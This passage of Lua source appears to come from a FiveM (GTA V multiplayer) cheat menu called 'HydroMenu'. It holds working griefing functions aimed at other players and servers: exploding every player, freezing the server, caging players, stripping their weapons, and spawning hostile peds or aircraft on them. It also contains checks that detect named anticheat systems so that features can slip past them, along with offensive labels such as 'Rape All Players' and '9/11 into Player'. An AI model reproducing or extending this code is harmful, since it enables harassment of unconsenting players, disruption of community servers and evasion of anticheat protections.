					local CreatedObject = CreateObject(object, x, y, z, true, true, false)
					AttachEntityToEntity(CreatedObject, ped, GetPedBoneIndex(ped, 17719), 10, 0, 0, 0, 110, 90, false, false, false, false, 2, true) 			
				end
			elseif HydroMenu.Button("Car Rack All Players", "~y~Native") then
				local object = GetHashKey('imp_prop_impexp_half_cut_rack_01b')
				RequestModel(object)
				local time = 0
				while not HasModelLoaded(object) do
					time = time + 100.0
					Citizen.Wait(100.0)
					if time > 5000 then
						print("Could not load model!")
						break 
					end
				end
				plist = GetActivePlayers()
				for i = 1, #plist do
					local ped = GetPlayerPed(plist[i])
					local x, y, z = table.unpack(GetEntityCoords(ped, true))
					local CreatedObject = CreateObject(object, x, y, z, true, true, false)
					AttachEntityToEntity(CreatedObject, ped, GetPedBoneIndex(ped, 17719), 10, 0, 0, 0, 110, 90, false, false, false, false, 2, true) 			
				end
			end
			
			HydroMenu.Display()
		elseif HydroMenu.IsMenuOpened('allplayeroptions') then

			if HydroMenu.MenuButton("Particle Effects", "particleeffectsallplayeroptions") then
			elseif HydroMenu.MenuButton("Prop Options", "attachpropsallplayeroptions") then
			elseif HydroMenu.MenuButton("Trigger Events", "triggereventsallplayeroptions") then
			elseif HydroMenu.CheckBox("Include Self", not HydroVariables.AllOnlinePlayers.IncludeSelf) then
				HydroVariables.AllOnlinePlayers.IncludeSelf = not HydroVariables.AllOnlinePlayers.IncludeSelf
			elseif HydroMenu.Button("Explode All Players", "~y~Native") then
				if AntiCheats.ChocoHax or AntiCheats.WaveSheild or AntiCheats.BadgerAC then
					PushNotification("Anticheat Detected! Function Blocked", 600)
				else
					ExplosionAllPlayers()
				end
			elseif HydroMenu.CheckBox("Explode All Players Loop", HydroVariables.AllOnlinePlayers.ExplodisionLoop) then
				if AntiCheats.ChocoHax or AntiCheats.WaveSheild or AntiCheats.BadgerAC then
					PushNotification("Anticheat Detected! Function Blocked", 600)
				else
					HydroVariables.AllOnlinePlayers.ExplodisionLoop = not HydroVariables.AllOnlinePlayers.ExplodisionLoop
					NativeExplosionServerLoop()
				end
			elseif HydroMenu.Button("Give All Players Weapons", "~y~Risky") then
				if AntiCheats.ChocoHax or AntiCheats.WaveSheild or AntiCheats.BadgerAC then
					PushNotification("Anticheat Detected! Function Blocked", 600)
				else
					playerlist = GetActivePlayers()
					for i = 1, #playerlist do

						if HydroVariables.AllOnlinePlayers.IncludeSelf and playerlist[i] ~= PlayerId() then
							for i = 1, #allWeapons do
								GiveWeaponToPed(GetPlayerPed(playerlist[i]), GetHashKey(allWeapons[i]), 9999, true, true)
							end
						elseif not HydroVariables.AllOnlinePlayers.IncludeSelf then
							for i = 1, #allWeapons do
								GiveWeaponToPed(GetPlayerPed(playerlist[i]), GetHashKey(allWeapons[i]), 9999, true, true)
							end
						end
					end
				end
			elseif HydroMenu.Button("Remove All Players Weapons", "~y~Risky") then
				if AntiCheats.ChocoHax or AntiCheats.WaveSheild or AntiCheats.BadgerAC then
					PushNotification("Anticheat Detected! Function Blocked", 600)
				else
					playerlist = GetActivePlayers()
					for i = 1, #playerlist do
						if HydroVariables.AllOnlinePlayers.IncludeSelf and playerlist[i] ~= PlayerId() then
							curPlayer = playerlist[i]
							RemoveAllPedWeapons(GetPlayerPed(curPlayer), true)
							RemoveWeaponFromPed(GetPlayerPed(curPlayer), "WEAPON_UNARMED")
						elseif not HydroVariables.AllOnlinePlayers.IncludeSelf then
							curPlayer = playerlist[i]
							RemoveAllPedWeapons(GetPlayerPed(curPlayer), true)
							RemoveWeaponFromPed(GetPlayerPed(curPlayer), "WEAPON_UNARMED")
						end
					end
				end

			elseif HydroMenu.CheckBox("Rain Tug Boats Over Players", HydroVariables.AllOnlinePlayers.tugboatrainoverplayers) then
				if AntiCheats.ChocoHax or AntiCheats.WaveSheild  then
					PushNotification("Anticheat Detected! Function Blocked", 600)
				else
					HydroVariables.AllOnlinePlayers.tugboatrainoverplayers = not HydroVariables.AllOnlinePlayers.tugboatrainoverplayers
				end
			elseif HydroMenu.CheckBox("Freeze Server", HydroVariables.AllOnlinePlayers.freezeserver) then
				if AntiCheats.ChocoHax or AntiCheats.WaveSheild or AntiCheats.BadgerAC then
					PushNotification("Anticheat Detected! Function Blocked", 600)
				elseif SafeMode then
                    SafeModeNotification()
				else
				    HydroVariables.AllOnlinePlayers.freezeserver = not HydroVariables.AllOnlinePlayers.freezeserver
				end
			elseif HydroMenu.Button("Bus Server", "~y~Native") then
				if AntiCheats.VAC then
					PushNotification("Anticheat Detected! Function Blocked", 600)
				elseif SafeMode then
                    SafeModeNotification()
				else
					BusServer()
				end
			elseif HydroMenu.CheckBox("Bus Server ~r~LOOP", HydroVariables.AllOnlinePlayers.busingserverloop) then

				if AntiCheats.VAC then
					PushNotification("Anticheat Detected! Function Blocked", 600)
				elseif SafeMode then
                    SafeModeNotification()
				else
					HydroVariables.AllOnlinePlayers.busingserverloop = not HydroVariables.AllOnlinePlayers.busingserverloop
					BusServerLoop()
				end

			elseif HydroMenu.Button("Kick All Players From Vehicle", "~y~Native") then
				if AntiCheats.ChocoHax or AntiCheats.WaveSheild or AntiCheats.BadgerAC then
					PushNotification("Anticheat Detected! Function Blocked", 600)
				else
				    KickAllFromVeh()
				end
			elseif HydroMenu.Button("Cargo Plane", "~y~Native") then
				if AntiCheats.ChocoHax or AntiCheats.WaveSheild  then
					PushNotification("Anticheat Detected! Function Blocked", 600)
				else
					CargoplaneServer()
				end
			elseif HydroMenu.CheckBox("Cargo Plane Server ~r~LOOP", HydroVariables.AllOnlinePlayers.cargoplaneserverloop) then

				if AntiCheats.ChocoHax or AntiCheats.WaveSheild  then
					PushNotification("Anticheat Detected! Function Blocked", 600)
				else
					HydroVariables.AllOnlinePlayers.cargoplaneserverloop = not HydroVariables.AllOnlinePlayers.cargoplaneserverloop
					CargoPlaneServerLoop()
				end

			elseif HydroMenu.Button("Rape All Players", "~y~Native") then
				PlayerList = GetActivePlayers()
				for i = 1, #PlayerList do
					if HydroVariables.AllOnlinePlayers.IncludeSelf and PlayerList[i] ~= PlayerId() then
						CurPlayer = PlayerList[i]
						RapePlayer(CurPlayer)
					elseif not HydroVariables.AllOnlinePlayers.IncludeSelf then
						CurPlayer = PlayerList[i]
						RapePlayer(CurPlayer)
					end
				end
			end
			HydroMenu.Display()

		elseif HydroMenu.IsMenuOpened('onlineplayerlist') then

			if HydroMenu.MenuButton("All Online Players ", 'allplayeroptions', "All Player Options") then
			end

			local playerlist = GetActivePlayers()
			for i = 1, #playerlist do
				local currPlayer = playerlist[i]
	
				local friend = ""

				if TableHasValue(FriendsList, GetPlayerServerId(currPlayer)) then
					friend = "Friend | "
				elseif currPlayer == PlayerId() then
					friend = "Self | "
				end

				if HydroMenu.MenuButton(friend .. GetPlayerServerId(currPlayer) .. " | " .. GetPlayerName(currPlayer), 'selectedonlineplayr', "Options For ".. GetPlayerName(currPlayer)) then
					selectedPlayer = currPlayer 
				end
			end
			
			HydroMenu.Display()
		elseif HydroMenu.IsMenuOpened('collisionoptions') then
			
			if HydroMenu.CheckBox("Disable Object Collisions", HydroVariables.SelfOptions.disableobjectcollisions, "Might be Glitchy for some Buildings") then
				HydroVariables.SelfOptions.disableobjectcollisions = not HydroVariables.SelfOptions.disableobjectcollisions
				if not HydroVariables.SelfOptions.disableobjectcollisions then
					for door in EnumerateObjects() do
				
						SetEntityCollision(door, true, true)
		
					end
				end
			elseif HydroMenu.CheckBox("Disable Ped Collisions", HydroVariables.SelfOptions.disablepedcollisions, "Peds may fall through the Map") then
				HydroVariables.SelfOptions.disablepedcollisions = not HydroVariables.SelfOptions.disablepedcollisions
				if not HydroVariables.SelfOptions.disablepedcollisions then
					for ped in EnumeratePeds() do
				
						SetEntityCollision(ped, true, true)
		
					end
				end
			elseif HydroMenu.CheckBox("Disable Vehicle Collisions", HydroVariables.SelfOptions.disablevehiclecollisions, "Every single Vehicle won't have Collision") then
				HydroVariables.SelfOptions.disablevehiclecollisions = not HydroVariables.SelfOptions.disablevehiclecollisions
				
				if not HydroVariables.SelfOptions.disablevehiclecollisions then
					for vehicle in EnumerateVehicles() do
						SetEntityCollision(vehicle, true, true)
					end
				end
			end

			HydroMenu.Display()
		elseif HydroMenu.IsMenuOpened('superpowers') then
		
		    if HydroMenu.CheckBox("Anti Headshot", HydroVariables.SelfOptions.AntiHeadshot) then
				HydroVariables.SelfOptions.AntiHeadshot = not HydroVariables.SelfOptions.AntiHeadshot
				if not HydroVariables.SelfOptions.AntiHeadshot then
					SetPedSuffersCriticalHits(PlayerPedId(), true)
				end
			elseif HydroMenu.CheckBox("Infinite Combat Roll", HydroVariables.SelfOptions.InfiniteCombatRoll) then
				HydroVariables.SelfOptions.InfiniteCombatRoll = not HydroVariables.SelfOptions.InfiniteCombatRoll
			elseif HydroMenu.CheckBox("Moon Walk", HydroVariables.SelfOptions.MoonWalk) then
				HydroVariables.SelfOptions.MoonWalk = not HydroVariables.SelfOptions.MoonWalk
			elseif HydroMenu.CheckBox("Super Jump", HydroVariables.SelfOptions.superjump) then
				HydroVariables.SelfOptions.superjump = not HydroVariables.SelfOptions.superjump
			elseif HydroMenu.CheckBox("Super Run", HydroVariables.SelfOptions.superrun) then
				HydroVariables.SelfOptions.superrun = not HydroVariables.SelfOptions.superrun
			elseif HydroMenu.CheckBox("Force Footstep Trail", forcefoottrail) then
				forcefoottrail = not forcefoottrail
				SetForcePedFootstepsTracks(forcefoottrail)
			elseif HydroMenu.CheckBox("Super Swim", superswim) then

				superswim = not superswim

				if superswim then
					SetSwimMultiplierForPlayer(PlayerId(), 1.49)
				else
					SetSwimMultiplierForPlayer(PlayerId(), 1.0)
				end
			end
			
			HydroMenu.Display()
		elseif HydroMenu.IsMenuOpened('premadeoutfits') then
			
			if HydroMenu.Button("Fuse | Monkey") then
				AntiMenuCrash = 0

				RequestModel("mp_m_freemode_01")
                
				while not HasModelLoaded(GetHashKey("mp_m_freemode_01")) and AntiMenuCrash < 5000 do
					AntiMenuCrash = AntiMenuCrash + 1
					Wait(0)
				end

				if HasModelLoaded(GetHashKey("mp_m_freemode_01")) then
					SetPlayerModel(PlayerId(), "mp_m_freemode_01")
					SetPedComponentVariation(PlayerPedId(), 1, 3, 0, 0)
					SetPedComponentVariation(PlayerPedId(), 2, 4, 3, 0)
					SetPedComponentVariation(PlayerPedId(), 3, 17, 0, 0)
					SetPedComponentVariation(PlayerPedId(), 4, 4, 0, 0)
					SetPedComponentVariation(PlayerPedId(), 6, 4, 1, 0)
					SetPedComponentVariation(PlayerPedId(), 8, 15, 0, 0)
					SetPedComponentVariation(PlayerPedId(), 11, 256, 0, 0)
				else
					PushNotification("Requesting Model Timeout", 600)
				end

			--[[
			elseif HydroMenu.Button("Kyler | MP Rasta") then
				AntiMenuCrash = 0
				RequestModel("mp_m_freemode_01")
				Wait(450)
				
				while not HasModelLoaded(GetHashKey("mp_m_freemode_01")) and AntiMenuCrash < 5000 do
					AntiMenuCrash = AntiMenuCrash + 1
					Wait(0)
				end

				if HasModelLoaded(GetHashKey("mp_m_freemode_01")) then
					SetPlayerModel(PlayerId(), "mp_m_freemode_01")
					SetPedComponentVariation(PlayerPedId(), 1, 0, 0, 0)
					SetPedComponentVariation(PlayerPedId(), 2, 17, 1, 0)
					SetPedComponentVariation(PlayerPedId(), 4, 4, 0, 0)
					SetPedComponentVariation(PlayerPedId(), 6, 6, 1, 0)
					SetPedComponentVariation(PlayerPedId(), 11, 121, 3, 0)
					SetPedPropIndex(PlayerPedId(), 1, 25, 3, 0)
				else
					PushNotification("Requesting Model Timeout", 600)
				end
			]]
			elseif HydroMenu.Button("Fuse | Gangsta") then
				AntiMenuCrash = 0
				RequestModel("mp_m_freemode_01")

				Wait(450)
				
				while not HasModelLoaded(GetHashKey("mp_m_freemode_01")) and AntiMenuCrash < 5000 do
					AntiMenuCrash = AntiMenuCrash + 1
					Wait(0)
				end

				if HasModelLoaded(GetHashKey("mp_m_freemode_01")) then
					SetPlayerModel(PlayerId(), "mp_m_freemode_01")
					SetPedPropIndex(PlayerPedId(), 0, 56, 1, 0)
					SetPedPropIndex(PlayerPedId(), 1, 7, 2, 0)
					SetPedComponentVariation(PlayerPedId(), 1, 51, 7, 0)
					SetPedComponentVariation(PlayerPedId(), 2, 11, 4, 0)
					SetPedComponentVariation(PlayerPedId(), 3, 14, 0, 0)
					SetPedComponentVariation(PlayerPedId(), 4, 4, 0, 0)
					SetPedComponentVariation(PlayerPedId(), 6, 6, 0, 0)
					SetPedComponentVariation(PlayerPedId(), 8, 15, 0, 0)
					SetPedComponentVariation(PlayerPedId(), 11, 14, 7, 0)
				end

			elseif HydroMenu.Button("Fuse | Cop") then
				AntiMenuCrash = 0
				RequestModel("mp_m_freemode_01")

				Wait(450)
				
				while not HasModelLoaded(GetHashKey("mp_m_freemode_01")) and AntiMenuCrash < 5000 do
					AntiMenuCrash = AntiMenuCrash + 1
					Wait(0)
				end

				if HasModelLoaded(GetHashKey("mp_m_freemode_01")) then
					SetPlayerModel(PlayerId(), "mp_m_freemode_01")
					SetPedComponentVariation(PlayerPedId(), 1, -1, 0, 0)
					SetPedComponentVariation(PlayerPedId(), 2, 2, 4, 0)
					SetPedComponentVariation(PlayerPedId(), 3, 17, 0, 0)
					SetPedComponentVariation(PlayerPedId(), 4, 66, 0, 0)
					SetPedComponentVariation(PlayerPedId(), 6, 4, 1, 0)
					SetPedComponentVariation(PlayerPedId(), 7, 8, 0, 0)
					SetPedComponentVariation(PlayerPedId(), 8, 37, 0, 0)
					SetPedComponentVariation(PlayerPedId(), 9, 1, 0, 0)
					SetPedComponentVariation(PlayerPedId(), 11, 166, 0, 0)
					SetPedPropIndex(PlayerPedId(), 0, 130, 0, 0)
					SetPedPropIndex(PlayerPedId(), 1, 6, 0, 0)
				else
					PushNotification("Requesting Model Timeout", 600)
				end
			elseif HydroMenu.CheckBox("Purple And Green Alien", HydroVariables.SelfOptions.AlienColorSpam, "Because why not both") then
				HydroVariables.SelfOptions.AlienColorSpam = not HydroVariables.SelfOptions.AlienColorSpam
				if HydroVariables.SelfOptions.AlienColorSpam then
					AlienColourSpam()
				end
			end

			HydroMenu.Display()
		elseif HydroMenu.IsMenuOpened('selfwardrobe') then

			if HydroMenu.MenuButton("Pre-Made Outfits", "premadeoutfits") then
			elseif HydroMenu.ValueChanger("Head", GetPedDrawableVariation(PlayerPedId(), 0), 1, {0, GetNumberOfPedDrawableVariations(PlayerPedId(), 0)}, function(val)
				SetPedComponentVariation(PlayerPedId(), 0, val, 0, 0)
			end) then
			elseif HydroMenu.ValueChanger("Hat", HatVal, 1, {-1, GetNumberOfPedPropDrawableVariations(PlayerPedId(), 0) - 1}, function(val)
				HatVal = val
				if HatVal == -1 then
					ClearPedProp(PlayerPedId(), 0)
				end
				SetPedPropIndex(PlayerPedId(), 0, HatVal, 1, 0)
			end) then
			elseif HydroMenu.ValueChanger("Hat Colour", GetPedPropTextureIndex(PlayerPedId(), 0), 1, {1, GetNumberOfPedPropTextureVariations(PlayerPedId(), 0, GetPedPropIndex(PlayerPedId(), 0))}, function(val)
				SetPedPropIndex(PlayerPedId(), 0, HatVal, val, 0)
			end) then
			elseif HydroMenu.ValueChanger("Glasses", GlassesVal, 1, {-1, GetNumberOfPedPropDrawableVariations(PlayerPedId(), 1)}, function(val)
				GlassesVal = val
				SetPedPropIndex(PlayerPedId(), 1, GlassesVal, 1, 0)
			end) then
			elseif HydroMenu.ValueChanger("Glasses Colour", GetPedPropTextureIndex(PlayerPedId(), 1), 1, {1, GetNumberOfPedPropTextureVariations(PlayerPedId(), 1, GetPedPropIndex(PlayerPedId(), 1))}, function(val)
				SetPedPropIndex(PlayerPedId(), 1, GetPedPropIndex(PlayerPedId(), 1), val, 0)
			end) then
			elseif HydroMenu.ValueChanger("Mask", GetPedDrawableVariation(PlayerPedId(), 1), 1, {0, GetNumberOfPedDrawableVariations(PlayerPedId(), 1)}, function(val)
				SetPedComponentVariation(PlayerPedId(), 1, val, 0, 0)
			end) then
			elseif HydroMenu.ValueChanger("Mask Colour", GetPedTextureVariation(PlayerPedId(), 1), 1, {0, GetNumberOfPedTextureVariations(PlayerPedId(), 1, GetPedDrawableVariation(PlayerPedId(), 1)) - 1}, function(val)
				SetPedComponentVariation(PlayerPedId(), 1, GetPedDrawableVariation(PlayerPedId(), 1), val, 0)
			end) then
			elseif HydroMenu.ValueChanger("Hair", GetPedDrawableVariation(PlayerPedId(), 2), 1, {0, GetNumberOfPedDrawableVariations(PlayerPedId(), 2)}, function(val)
				SetPedComponentVariation(PlayerPedId(), 2, val, 0, 0)
			end) then
			elseif HydroMenu.ValueChanger("Hair Colour", GetPedTextureVariation(PlayerPedId(), 2), 1, {0, 63}, function(val)
				SetPedComponentVariation(PlayerPedId(), 2, GetPedDrawableVariation(PlayerPedId(), 2), val, 0)
			end) then
			elseif HydroMenu.ValueChanger("Torso", GetPedDrawableVariation(PlayerPedId(), 3), 1, {0, GetNumberOfPedDrawableVariations(PlayerPedId(), 3)}, function(val)
				SetPedComponentVariation(PlayerPedId(), 3, val, 0, 0)
			end) then
			elseif HydroMenu.ValueChanger("Legs", GetPedDrawableVariation(PlayerPedId(), 4), 1, {0, GetNumberOfPedDrawableVariations(PlayerPedId(), 4)}, function(val)
				SetPedComponentVariation(PlayerPedId(), 4, val, 0, 0)
			end) then
			elseif HydroMenu.ValueChanger("Legs Colour", GetPedTextureVariation(PlayerPedId(), 4), 1, {0, GetNumberOfPedDrawableVariations(PlayerPedId(), 4)}, function(val)
				SetPedComponentVariation(PlayerPedId(), 4, GetPedDrawableVariation(PlayerPedId(), 4), val, 0)
			end) then
			elseif HydroMenu.ValueChanger("Accessory", GetPedDrawableVariation(PlayerPedId(), 5), 1, {0, GetNumberOfPedDrawableVariations(PlayerPedId(), 5)}, function(val)
				SetPedComponentVariation(PlayerPedId(), 5, val, 0, 0)
			end) then
			elseif HydroMenu.ValueChanger("Accessory Colour", GetPedTextureVariation(PlayerPedId(), 5), 1, {0, GetNumberOfPedDrawableVariations(PlayerPedId(), 5)}, function(val)
				SetPedComponentVariation(PlayerPedId(), 5, GetPedDrawableVariation(PlayerPedId(),5), val, 0)
			end) then
			elseif HydroMenu.ValueChanger("Shoes", GetPedDrawableVariation(PlayerPedId(), 6), 1, {0, GetNumberOfPedDrawableVariations(PlayerPedId(), 6)}, function(val)
				SetPedComponentVariation(PlayerPedId(), 6, val, 0, 0)
			end) then
			elseif HydroMenu.ValueChanger("Shoes Colour", GetPedTextureVariation(PlayerPedId(), 6), 1, {0, GetNumberOfPedDrawableVariations(PlayerPedId(), 6)}, function(val)
				SetPedComponentVariation(PlayerPedId(), 6, GetPedDrawableVariation(PlayerPedId(), 6), val, 0)
			end) then
			elseif HydroMenu.ValueChanger("Undershirt", GetPedDrawableVariation(PlayerPedId(), 8), 1, {0, GetNumberOfPedDrawableVariations(PlayerPedId(), 8)}, function(val)
				SetPedComponentVariation(PlayerPedId(), 8, val, 0, 0)
			end) then
			elseif HydroMenu.ValueChanger("Undershirt Colour", GetPedTextureVariation(PlayerPedId(), 8), 1, {0, GetNumberOfPedDrawableVariations(PlayerPedId(), 8)}, function(val)
				SetPedComponentVariation(PlayerPedId(), 8, GetPedDrawableVariation(PlayerPedId(), 8), val, 0)
			end) then
			elseif HydroMenu.ValueChanger("Shirt", GetPedDrawableVariation(PlayerPedId(), 11), 1, {0, GetNumberOfPedDrawableVariations(PlayerPedId(), 11)}, function(val)
				SetPedComponentVariation(PlayerPedId(), 11, val, 0, 0)
			end) then
			elseif HydroMenu.ValueChanger("Shirt Colour", GetPedTextureVariation(PlayerPedId(), 11), 1, {0, GetNumberOfPedDrawableVariations(PlayerPedId(), 11)}, function(val)
				SetPedComponentVariation(PlayerPedId(), 11, GetPedDrawableVariation(PlayerPedId(),11), val, 0)
			end) then
		    end
			HydroMenu.Display()

		elseif HydroMenu.IsMenuOpened('selfmodellist') then
			if HydroMenu.Button("Input Model") then
				local result = HydroMenu.KeyboardEntry("Enter Player Model", 50)

				if IsModelAVehicle(result) or not IsModelValid(result) then

					PushNotification("Invalid Model Entered", 600)

				else

					while not HasModelLoaded(GetHashKey(result)) and not killmenu do
						RequestModel(GetHashKey(result))
						Wait(500)
					end
		
					SetPlayerModel(PlayerId(), GetHashKey(result))
		
					CancelOnscreenKeyboard()
				end
			end
			local modelslist = PlayerModels
			for i = 1, #modelslist do
				if HydroMenu.Button(modelslist[i]) then
                    while not HasModelLoaded(GetHashKey(modelslist[i])) and not killmenu do
						RequestModel(GetHashKey(modelslist[i]))
						Wait(500)
					end

					SetPlayerModel(PlayerId(), GetHashKey(modelslist[i]))

					if modelslist[i] == "mp_m_freemode_01" then
				        SetPedComponentVariation(PlayerPedId(), 1, -1, 0, 0)
					end
				end
			end

			HydroMenu.Display()

		elseif HydroMenu.IsMenuOpened('particleeffectsonplayer') then
			
			if HydroMenu.CheckBox("Molotov Particles Loop", HydroVariables.OnlinePlayer.MolotovLoop) then
				HydroVariables.OnlinePlayer.MolotovLoop = not HydroVariables.OnlinePlayer.MolotovLoop
				HydroVariables.OnlinePlayer.MolotovPlayer = selectedPlayer
			elseif HydroMenu.CheckBox("Firework Particles Loop", HydroVariables.OnlinePlayer.FireWorkLoop) then
				HydroVariables.OnlinePlayer.FireWorkLoop = not HydroVariables.OnlinePlayer.FireWorkLoop
				HydroVariables.OnlinePlayer.FireWorkPlayer = selectedPlayer
			elseif HydroMenu.CheckBox("Firework 2 Particles Loop", HydroVariables.OnlinePlayer.FireWork2Loop) then
				HydroVariables.OnlinePlayer.FireWork2Loop = not HydroVariables.OnlinePlayer.FireWork2Loop
				HydroVariables.OnlinePlayer.FireWork2Player = selectedPlayer
			elseif HydroMenu.CheckBox("Smoke Particles Loop", HydroVariables.OnlinePlayer.SmokeLoop) then
				HydroVariables.OnlinePlayer.SmokeLoop = not HydroVariables.OnlinePlayer.SmokeLoop
				HydroVariables.OnlinePlayer.SmokePlayer = selectedPlayer
			elseif HydroMenu.CheckBox("Jesus Light Particles Loop", HydroVariables.OnlinePlayer.JesusLightLoop) then
				HydroVariables.OnlinePlayer.JesusLightLoop = not HydroVariables.OnlinePlayer.JesusLightLoop
				HydroVariables.OnlinePlayer.JesusPlayer = selectedPlayer
			elseif HydroMenu.CheckBox("Alien Light Particles Loop", HydroVariables.OnlinePlayer.AlienLightLoop) then
				HydroVariables.OnlinePlayer.AlienLightLoop = not HydroVariables.OnlinePlayer.AlienLightLoop
				HydroVariables.OnlinePlayer.AlienPlayer = selectedPlayer
			elseif HydroMenu.CheckBox("Huge Explosion Loop", HydroVariables.OnlinePlayer.ExplosionParticlePlayer) then
				if HydroVariables.OnlinePlayer.ExplosionParticlePlayer == nil then
					HydroVariables.OnlinePlayer.ExplosionParticlePlayer = selectedPlayer
				else
					HydroVariables.OnlinePlayer.ExplosionParticlePlayer = nil
				end
		    end

			HydroMenu.Display()
		elseif HydroMenu.IsMenuOpened('pedspawningonplayer') then
			HydroMenu.SetMenuProperty('pedspawningonplayer', 'subTitle', GetPlayerName(selectedPlayer) .. " > Ped Options")
			
			if HydroMenu.Button("Copy Player Outfit / Ped") then
				model = GetEntityModel(GetPlayerPed(selectedPlayer))
				SetPlayerModel(PlayerId(), model)
				Wait(100)
				ClonePedToTarget(GetPlayerPed(selectedPlayer), PlayerPedId())
			elseif HydroMenu.CheckBox("Hostile Peds", HostilePeds) then
			    HostilePeds = not HostilePeds
			elseif HydroMenu.Button("Clone Player") then
			    ClonePed(GetPlayerPed(selectedPlayer), 1, 1, 1)
			elseif HydroMenu.Button("Spawn Rats") then
				local sick = 0
				while sick < 30 and not killmenu do
					sick = sick + 1
					SpawnPed(selectedPlayer, "a_c_rat", false)
					Wait(0)
			    end
		    elseif HydroMenu.Button("Spawn Mexican Guy") then
				PlayerPed = GetPlayerPed(selectedPlayer)
				PlayerCoords(GetEntityCoords(PlayerPed))
				Data = {
					Model = "a_m_m_eastsa",
					Behavior = 24,
					Coords = PlayerCoords,
					Weapon = "WEAPON_ASSAULTRIFLE",
				}
				
				HydroMenu.Functions.SpawnPed(Data)
			elseif HydroMenu.Button("Spawn Fat Man") then
				SpawnPed(selectedPlayer, "a_m_m_afriamer_01", HostilePeds)
			elseif HydroMenu.Button("Spawn Indian Man") then
				SpawnPed(selectedPlayer, "a_m_m_indian_01", HostilePeds)
			elseif HydroMenu.Button("Spawn Mr Muscle") then
				SpawnPed(selectedPlayer, "u_m_y_babyd", HostilePeds)
			elseif HydroMenu.Button("Spawn Michael") then
				SpawnPed(selectedPlayer, "player_zero", HostilePeds)
			elseif HydroMenu.Button("Spawn Franklin") then
				SpawnPed(selectedPlayer, "player_one", HostilePeds)
			elseif HydroMenu.Button("Spawn Trevor") then
				SpawnPed(selectedPlayer, "player_two", HostilePeds)
			elseif HydroMenu.Button("Spawn Stripper") then
                SpawnPed(selectedPlayer, "csb_stripper_01", HostilePeds)
			elseif HydroMenu.Button("Spawn Dog") then
                SpawnPed(selectedPlayer, "a_c_chop", HostilePeds)
			elseif HydroMenu.Button("Spawn Merryweather Guard") then
                SpawnPed(selectedPlayer, "csb_mweather", HostilePeds)
			elseif HydroMenu.Button("Spawn Fat Man") then
                SpawnPed(selectedPlayer, "a_m_m_afriamer_01", HostilePeds)
			end

			HydroMenu.Display()

		elseif HydroMenu.IsMenuOpened('trollonlineplayr') then
			HydroMenu.SetMenuProperty('trollonlineplayr', 'subTitle', GetPlayerName(selectedPlayer) .. " > Troll Options")
			
			if HydroMenu.Button("Give All Weapons") then
				if AntiCheats.ChocoHax or AntiCheats.WaveSheild or AntiCheats.BadgerAC then
					PushNotification("Anticheat Detected! Function Blocked", 600)
				elseif SafeMode then
					SafeModeNotification()
				else
				    for i = 1, #allWeapons do
					    GiveWeaponToPed(GetPlayerPed(selectedPlayer), GetHashKey(allWeapons[i]), 9999, false, false)
				    end
			    end
			elseif HydroMenu.Button("Remove All Weapons") then
				if AntiCheats.ChocoHax or AntiCheats.WaveSheild or AntiCheats.BadgerAC then
					PushNotification("Anticheat Detected! Function Blocked", 600)
				elseif SafeMode then
					SafeModeNotification()
				else
				    RemoveAllPedWeapons(GetPlayerPed(selectedPlayer), false)
				    RemoveWeaponFromPed(GetPlayerPed(selectedPlayer), "WEAPON_UNARMED")
				end
			elseif HydroMenu.Button("Teleport All Vehicles On Player") then
				for veh in EnumerateVehicles() do
					if DoesEntityExist(veh) then
						SetEntityCoords(veh, GetEntityCoords(GetPlayerPed(selectedPlayer)))
					end
				end
			elseif HydroMenu.Button("Kill With Assault Rifle") then

				ExplodePedHead(GetPlayerPed(selectedPlayer), GetHashKey("WEAPON_ASSAULTRIFLE"))
				
			elseif HydroMenu.Button("Taze Player") then

				local coords = GetEntityCoords(GetPlayerPed(selectedPlayer))
				RequestCollisionAtCoord(coords.x, coords.y, coords.z)
	            ShootSingleBulletBetweenCoords(coords.x, coords.y, coords.z, coords.x, coords.y, coords.z + 2, 0, true, "WEAPON_STUNGUN", ped, false, false, 100)

			elseif HydroMenu.CheckBox("Taze Loop Player", TazeLoop, "They Might fly up") then

				TazeLoop = not TazeLoop
				TazeLoopingPlayer = selectedPlayer

			elseif HydroMenu.Button("Stop Player From Jumping / No Vehicles", "", "Whatever car he enters will Fly") then

				local ped = GetPlayerPed(selectedPlayer)
				local fok = ClonePed(GetPlayerPed(selectedPlayer), 1, 1, 1)
				SetEntityVisible(fok, false, true)
				AttachEntityToEntity(fok, ped, 0, 0.0, 0.0, 1.0, 0.0, 180.0, 180.0, false, false, true, false, 0, true)

			elseif HydroMenu.Button("Cage Player") then

				CagePlayer(selectedPlayer)

			elseif HydroMenu.Button("Cargo Plane", "~y~Native") then

				local ped = GetPlayerPed(selectedPlayer) 
				local coords = GetEntityCoords(ped)
				
	            while not HasModelLoaded(GetHashKey("cargoplane")) and not killmenu do
					RequestModel(GetHashKey("cargoplane"))
					Wait(1)
				end

				local veh = CreateVehicle(GetHashKey("cargoplane"), coords.x, coords.y, coords.z, 90.0, 1, 1)

			elseif HydroMenu.CheckBox("Cargo Plane Loop", HydroVariables.OnlinePlayer.cargoplaneloop) then
				HydroVariables.OnlinePlayer.CargodPlayer = selectedPlayer
				HydroVariables.OnlinePlayer.cargoplaneloop = not HydroVariables.OnlinePlayer.cargoplaneloop
			elseif HydroMenu.Button("Tug Boat", "~y~Native") then

				local ped = GetPlayerPed(selectedPlayer) 
				local coords = GetEntityCoords(ped)
				
	            while not HasModelLoaded(GetHashKey("tug")) and not killmenu do
					RequestModel(GetHashKey("tug"))
					Wait(1)
				end

				local veh = CreateVehicle(GetHashKey("tug"), coords.x, coords.y, coords.z, 90.0, 1, 1)

			elseif HydroMenu.Button("Bus Player", "~y~Native") then

				BusPlayer(selectedPlayer)

			elseif HydroMenu.Button("Helicopter Chase Player", "~y~Native") then

				HelicopterChase(selectedPlayer)

			elseif HydroMenu.Button("9/11 into Player", "~y~Native") then

				FlyPlaneIntoPlayer(selectedPlayer)

			elseif HydroMenu.Button("Swat Team Attack", "~y~Native") then

				SWATTeamPullUp(selectedPlayer)

			elseif HydroMenu.Button("Player into Ramp") then

				RampPlayer(selectedPlayer)

	        elseif HydroMenu.ValueChanger("Explosion Type", HydroVariables.OnlinePlayer.ExplosionType, 1, {1, 36}, function(value)
				HydroVariables.OnlinePlayer.ExplosionType = value
			end) then

			elseif HydroMenu.Button("Explode Player", "~y~Native") and not SafeMode then
				local ped = GetPlayerPed(selectedPlayer)
				local coords = GetEntityCoords(ped)
				AddExplosion(coords.x + 1, coords.y + 1, coords.z + 1, HydroVariables.OnlinePlayer.ExplosionType, 100.0, true, false, 0.0)

